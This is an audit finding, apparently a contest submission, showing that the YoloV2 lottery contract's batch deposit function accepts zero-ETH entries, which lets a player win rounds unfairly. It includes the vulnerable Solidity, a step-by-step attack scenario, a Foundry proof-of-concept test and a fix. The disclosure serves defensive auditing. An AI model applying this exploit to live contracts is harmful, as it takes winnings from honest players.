# Players can raise their opportunities to be a winner unfairly by depositing `0 eth` to rounds using `depositETHIntoMultipleRounds` function.

## Summary
Players can deposit `0 eth` to any round they want including current open round and upcoming rounds. This gives players extra and unfair opportunities to be a winner.

## Vulnerability Detail
Using `depositETHIntoMultipleRounds`, players can deposit ETH into multiple rounds in a single transaction. In this function, they check validation that received ether and length of passed parameter `amounts` are greater than 0.
```solidity
    function depositETHIntoMultipleRounds(uint256[] calldata amounts) external payable nonReentrant whenNotPaused {
        uint256 numberOfRounds = amounts.length;
@>      if (msg.value == 0 || numberOfRounds == 0) {
@>          revert ZeroDeposits();
@>      }

        uint256 startingRoundId = roundsCount;
        Round storage startingRound = rounds[startingRoundId];
        _validateRoundIsOpen(startingRound);

        _setCutoffTimeIfNotSet(startingRound);

        uint256 expectedValue;
        uint256[] memory entriesCounts = new uint256[](numberOfRounds);

        for (uint256 i; i < numberOfRounds; ++i) {
            uint256 roundId = _unsafeAdd(startingRoundId, i);
            Round storage round = rounds[roundId];
            uint256 roundValuePerEntry = round.valuePerEntry;
            if (roundValuePerEntry == 0) {
                (, , roundValuePerEntry) = _writeDataToRound({roundId: roundId, roundValue: 0});
            }

            _incrementUserDepositCount(roundId, round);

            uint256 depositAmount = amounts[i];
            if (depositAmount % roundValuePerEntry != 0) {
                revert InvalidValue();
            }
            uint256 entriesCount = _depositETH(round, roundId, roundValuePerEntry, depositAmount);
            expectedValue += depositAmount;

            entriesCounts[i] = entriesCount;
        }

        if (expectedValue != msg.value) {
            revert InvalidValue();
        }

        emit MultipleRoundsDeposited(msg.sender, startingRoundId, amounts, entriesCounts);

        if (
            _shouldDrawWinner(
                startingRound.numberOfParticipants,
                startingRound.maximumNumberOfParticipants,
                startingRound.deposits.length
            )
        ) {
            _drawWinner(startingRound, startingRoundId);
        }
    }
```
However, this function does not individually check whether the amount deposited to each round is greater than 0. This allows players to deposit `0 eth` to any round they want, either the current open round or upcoming rounds.

Therefore, if we assume that new round is opened with valuePerEntry of `0.01 eth`, then it is possible to perform following problem.

1. Alice deposits `0.01 eth` to the opened round. 
2. Bob(malicious player) calls `depositETHIntoMultipleRounds` function with parameter `amounts` as `[0, 0.01 eth]`. This means that Bob deposits `0 eth` to current opened round, `0.01 eth` to the next upcoming round. Of course, he should pay `0.01 eth` to this function.
3. Charlie deposits `0.02 eth` to the opened round.
4. Bob calls `depositETHIntoMultipleRounds` function again with same parameter of previous one.

To avoid complexity, let's assume that this round would be drawn in this situation.
In this situation, total entries of the round is 3 and length of `round.deposits` is 4.
After random number is arrived from VRF, the callback function `fulfillRandomWords` is called to decide the winner.
```solidity
    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal override {
        if (randomnessRequests[requestId].exists) {
            uint256 roundId = randomnessRequests[requestId].roundId;
            Round storage round = rounds[roundId];

            if (round.status == RoundStatus.Drawing) {
                round.status = RoundStatus.Drawn;
                uint256 randomWord = randomWords[0];
                randomnessRequests[requestId].randomWord = randomWord;

                uint256 count = round.deposits.length;
                uint256[] memory currentEntryIndexArray = new uint256[](count);
                for (uint256 i; i < count; ++i) {
                    currentEntryIndexArray[i] = uint256(round.deposits[i].currentEntryIndex);
                }

                uint256 currentEntryIndex = currentEntryIndexArray[_unsafeSubtract(count, 1)];
                uint256 winningEntry = _unsafeAdd(randomWord % currentEntryIndex, 1);
@>              round.winner = round.deposits[currentEntryIndexArray.findUpperBound(winningEntry)].depositor;
                round.protocolFeeOwed = (round.valuePerEntry * currentEntryIndex * round.protocolFeeBp) / 10_000;

                emit RoundStatusUpdated(roundId, RoundStatus.Drawn);

                _startRound({_roundsCount: roundId});
            }
        }
    }
```
`currentEntryIndexArray` is a array that saves the entry index of every deposit struct sequently. And in above situation its value is as follow:
```solidity
[1, 1, 3, 3]
```
And the depositors of to each element of above array are as follow:
```solidity
[
    1 => Alice,
    1 => Bob,
    3 => Charlie,
    3 => Bob,
]
```
As you can see, since Bob deposited `0 eth` to opened round, there are duplicated values in this array. Winner is decided by finding the first index that its entry index is greater or equal to `winningEntry` calculated from received random number in above array. 

But the problem is occured in this step. If the `winningEntry` is equal to an element of `currentEntryIndexArray`, the `findUpperBound` function doesn't return the first element's index that is equal to the random number due to function's internal logic. In other words, when the calculated `winningEntry` is 1 or 3, the winner would be selected as Bob unfairly not Alice or Charlie.

I wrote the test file for PoC as follow.
```solidity
contract UnfairWinnerSeletedTest is TestHelpers {
    address public alice = address(101);
    address public bob = address(102);
    address public charlie = address(103);

    function setUp() public {
        _forkMainnet();
        _deployYolo();

    }

    function test_depositWithZeroAmountUsingBatchDeposit(uint256 randomWord) public {
        vm.deal(alice, 1 ether);
        vm.deal(bob, 1 ether);
        vm.deal(charlie, 1 ether);

        assertEq(deposits.length, 1);

        IYoloV2.Deposit memory deposit = deposits[0];
        assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));
        assertEq(deposit.tokenAddress, address(0));
        assertEq(deposit.tokenId, 0);
        assertEq(deposit.tokenAmount, 0.01 ether);
        assertEq(deposit.depositor, alice);
        assertFalse(deposit.withdrawn);
        assertEq(deposit.currentEntryIndex, 1);

        vm.stopPrank();

        vm.startPrank(bob);
        yolo.depositETHIntoMultipleRounds{value: 0.01 ether}(_amounts());

        deposits = _getDeposits(1);
        assertEq(deposits.length, 2);

        deposit = deposits[1];
        assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));
        assertEq(deposit.tokenAddress, address(0));

        assertEq(deposit.depositor, bob);
        assertFalse(deposit.withdrawn);
        assertEq(deposit.currentEntryIndex, 1);

        vm.stopPrank();

        vm.startPrank(charlie);
        yolo.deposit{value: 0.02 ether}(1, _emptyDepositsCalldata());

        deposits = _getDeposits(1);
        assertEq(deposits.length, 3);

        deposit = deposits[2];
        assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));
        assertEq(deposit.tokenAddress, address(0));
        assertEq(deposit.tokenId, 0);
        assertEq(deposit.tokenAmount, 0.02 ether);
        assertEq(deposit.depositor, charlie);
        assertFalse(deposit.withdrawn);
        assertEq(deposit.currentEntryIndex, 3);

        vm.stopPrank();

        vm.startPrank(bob);
        yolo.depositETHIntoMultipleRounds{value: 0.01 ether}(_amounts());

        deposits = _getDeposits(1);
        assertEq(deposits.length, 4);

        deposit = deposits[3];
        assertEq(uint8(deposit.tokenType), uint8(IYoloV2.YoloV2__TokenType.ETH));
        assertEq(deposit.tokenAddress, address(0));
        assertEq(deposit.tokenId, 0);
        assertEq(deposit.tokenAmount, 0 ether);
        assertEq(deposit.depositor, bob);

        assertEq(deposit.currentEntryIndex, 3);

        vm.stopPrank();

        vm.prank(VRF_COORDINATOR);

        // According to `fulfillRandomWords` function, following assumption means that `winningEntry` becomes 1 or 3 (in other words, winner should be alice or charlie fairly, but...)
        vm.assume(randomWord % 3 == 0 || randomWord % 3 == 2);
        
        uint256[] memory randomWords = new uint256[](1);
        randomWords[0] = randomWord;

        vm.warp(block.timestamp + ROUND_DURATION);
        yolo.drawWinner();
        
        vm.prank(VRF_COORDINATOR);
        VRFConsumerBaseV2(yolo).rawFulfillRandomWords(FULFILL_RANDOM_WORDS_REQUEST_ID, randomWords);

        (
            IYoloV2.RoundStatus status, , , , , , address winner, , ,
        ) = yolo.getRound(1);
        assertEq(uint8(status), uint8(IYoloV2.RoundStatus.Drawn));
        assertEq(winner, bob);
    }

    function _amounts() private pure returns (uint256[] memory amounts) {
        amounts = new uint256[](2);
        amounts[0] = 0 ether;
        amounts[1] = 0.01 ether;
    }
}
```
As I wrote in comments of test, when the received `randomWord` is 0 or 2 (`winningEntry` is calculated as 1 or 3), the winner should be alice or charlie according to the `fulfillRandomWords` function. But winner is selected as Bob.
Bob is selected as a winner in current round without depositing actual ether. The `0.02 eth` which he deposited in couple of `depositETHIntoMultipleRounds` function calling will be used to raise his fair opportunity that can be selected as winner in next round.

Due to this issue, players may habitually attempt to use `depositETHIntoMultipleRounds` to gain unfair opportunity of winning. Also, by depositing 0 ether not only to the current round but also to upcoming rounds, they may have steal the winning chances of others who deposited before.

## Impact
Players can raise their winning chance unfairly by depositing `0 eth` to the rounds using `depositETHIntoMultipleRounds` function.

## Tool used

Manual Review

## Recommendation
In `depositETHIntoMultipleRounds` function, you should check if each deposit amount is greater than 0.
```diff
        for (uint256 i; i < numberOfRounds; ++i) {
            uint256 roundId = _unsafeAdd(startingRoundId, i);
            Round storage round = rounds[roundId];
            uint256 roundValuePerEntry = round.valuePerEntry;
            if (roundValuePerEntry == 0) {
                (, , roundValuePerEntry) = _writeDataToRound({roundId: roundId, roundValue: 0});
            }

            _incrementUserDepositCount(roundId, round);

            uint256 depositAmount = amounts[i];
+           if (depositAmount == 0) {
+               revert ZeroDeposits();
+           }
            if (depositAmount % roundValuePerEntry != 0) {
                revert InvalidValue();
            }
            uint256 entriesCount = _depositETH(round, roundId, roundValuePerEntry, depositAmount);
            expectedValue += depositAmount;

            entriesCounts[i] = entriesCount;
        }
```

And you'd better update the `findUpperBound` function of `libraries/Arrays.sol` contract(out of scope) to select the right index when the target is equal with an element of array.
